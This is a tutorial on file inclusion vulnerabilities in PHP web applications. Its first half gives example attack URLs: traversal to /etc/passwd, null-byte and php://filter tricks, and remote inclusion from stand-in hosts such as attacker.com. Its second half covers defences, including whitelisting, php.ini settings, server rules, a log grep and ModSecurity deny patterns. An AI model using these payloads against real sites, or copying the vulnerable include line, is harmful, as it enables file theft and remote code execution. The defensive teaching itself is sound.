# File inclusion

File inclusion is a web vulnerability allowing attackers to include files on a server through a web application, potentially leading to unauthorized access, data exposure, or code execution.

## METHODS TO PEFORM FILE INCLUSION

## 1.Advanced Techniques for LFI
- ###Directory Traversal

Attackers can use directory traversal sequences (e.g., ../) to navigate the file system and include files outside the intended directory.
Example:
```text
http://example.com/page.php?file=../../etc/passwd
```
- ### Null Byte Injection

In some cases, attackers can exploit null byte (%00) injection to terminate strings in file paths, allowing them to bypass file extension checks.
Example:
```text
http://example.com/page.php?file=somefile.php%00.jpg
```
- ### Log File Inclusion

Attackers can include log files that contain user input, potentially leading to code execution if the input is malicious.
Example:
```text
http://example.com/page.php?file=/var/log/apache2/access.log
```
- ### PHP Wrapper Exploitation

Attackers can use PHP wrappers (e.g., php://filter, php://input) to read files or execute code.
Example:
```text
http://example.com/page.php?file=php://filter/convert.base64-encode/resource=index.php
```
- ### File Inclusion via Session Variables

If the application uses session variables to determine file paths, attackers can manipulate these variables to include arbitrary files.
Example:
```text
// Set session variable to include a sensitive file
$_SESSION['file'] = '../../etc/passwd';
```
## 2.Advanced Techniques for RFI
- ### Remote File Inclusion

Attackers can include files from remote servers if the application does not validate the source of the file.
Example:
```text
http://example.com/page.php?file=http://malicious.com/malicious.php
```
- ### Using Local Files as a Proxy

Attackers can host a malicious file on their server and trick the application into including it by using a local file as a proxy.
Example:
```text
http://example.com/page.php?file=http://localhost/malicious.php
```
- ### Exploiting Misconfigured Servers

If a server is misconfigured to allow file uploads, attackers can upload a malicious file and then include it.
Example:
```text
// Upload a file named malicious.php
http://example.com/upload.php?file=malicious.php
```
- ### Using Protocols

Attackers can exploit different protocols (e.g., FTP, HTTP) to include files from remote locations.
Example:
```text
http://example.com/page.php?file=ftp://attacker.com/malicious.txt
```
- ### DNS Rebinding

Attackers can use DNS rebinding to trick the application into including files from a malicious server that appears to be a trusted domain.
Example:

An attacker sets up a domain that resolves to their server and then uses it in the RFI payload.

## MITIGATION FOR FILE INCLUSION

### 1️⃣ Use a Whitelist for Allowed Files
✅ Restrict file inclusion to specific files only.

🔹 Example (PHP) - Safe Whitelisting:

```text
$allowed_files = ['header.php', 'footer.php', 'sidebar.php'];
$file = $_GET['page']; // User-controlled input

if (in_array($file, $allowed_files)) {
    include $file;
} else {
    die("Access Denied");
```
✅ Why? Prevents attackers from including arbitrary files like /etc/passwd or ../../../../../etc/passwd.

### 2️⃣ Avoid Direct User Input in File Paths
❌ Bad Example (Vulnerable to LFI & RFI)
```text
include $_GET['page']; // Allows attackers to specify any file
```
✅ Secure Alternative (Using a Fixed Path)
```text
$file = basename($_GET['page']); // Removes directory traversal attempts
$path = "includes/" . $file . ".php"; // Ensures file exists in a secure folder

if (file_exists($path)) {
    include $path;
} else {
    die("Invalid file!");
}
```
✅ Why? Ensures only pre-defined files in the includes/ directory are allowed.

### 3️⃣ Disable allow_url_include in PHP (Prevents RFI)
If using PHP, disable remote file inclusion by setting this in php.ini:
```text
Edit
allow_url_include = Off
allow_url_fopen = Off
```
✅ Why? Prevents remote files from being included (e.g., http://attacker.com/shell.php).

### 4️⃣ Implement Proper Input Validation & Sanitization
✅ Remove dangerous characters to prevent directory traversal (../, %00, \, /, :).

🔹 Example (PHP) - Secure Input Handling
```text
$file = $_GET['page'];
$file = preg_replace('/[^a-zA-Z0-9_\-]/', '', $file); // Allow only alphanumeric, underscores, and hyphens
$path = "includes/" . $file . ".php";

if (file_exists($path)) {
    include $path;
} else {
    die("Invalid Request");
}
```
✅ Why? Removes special characters used in directory traversal attacks.

### 5️⃣ Restrict File Permissions & Disable Execution
✅ Prevent execution of uploaded files in directories like /uploads/.

🔹 For Apache (Prevent PHP Execution in Uploads Directory)
Add this to .htaccess:
```text
<Directory "/var/www/html/uploads">
    php_flag engine off
</Directory>
```
✅ Why? Prevents attackers from executing malicious PHP files in /uploads/.

🔹 For Nginx (Restrict PHP Execution in Uploads)
```text
location /uploads {
    location ~* \.php$ {
        deny all;
    }
}
```
✅ Why? Blocks execution of .php files in the /uploads directory.

### 6️⃣ Use Secure File Handling Functions
Instead of using include, use secure file handling functions like file_get_contents() with strict validation.

🔹 Example (PHP) - Using file_get_contents Securely
```text
$allowed_files = ['about.txt', 'contact.txt'];
$file = $_GET['file'];

if (in_array($file, $allowed_files)) {
    echo file_get_contents("safe_directory/" . $file);
} else {
    die("Invalid file request");
}
```
✅ Why? Prevents directory traversal and limits file access.

### 7️⃣ Monitor Logs & Set Alerts
✅ Monitor logs for LFI & RFI attack attempts (e.g., ../../, %00, http://).

🔹 Example (Linux - Monitor Access Logs for LFI Patterns)
```text
grep -E '(\.\./|%00|http://)' /var/log/apache2/access.log
```
✅ Why? Helps in detecting attacks in real-time and setting alerts.

### 8️⃣ Web Application Firewall (WAF) & ModSecurity Rules
✅ Deploy WAF rules to block LFI & RFI patterns.

🔹 Example (ModSecurity Rules - Block LFI & RFI Patterns)
```text
SecRule REQUEST_URI "@rx (\.\./|%00|/etc/passwd)" "id:1234,deny,status:403,msg:'Possible LFI Attack'"
SecRule ARGS "@rx (https?://)" "id:1235,deny,status:403,msg:'Possible RFI Attack'"
```
✅ Why? Blocks common LFI & RFI attack patterns automatically.



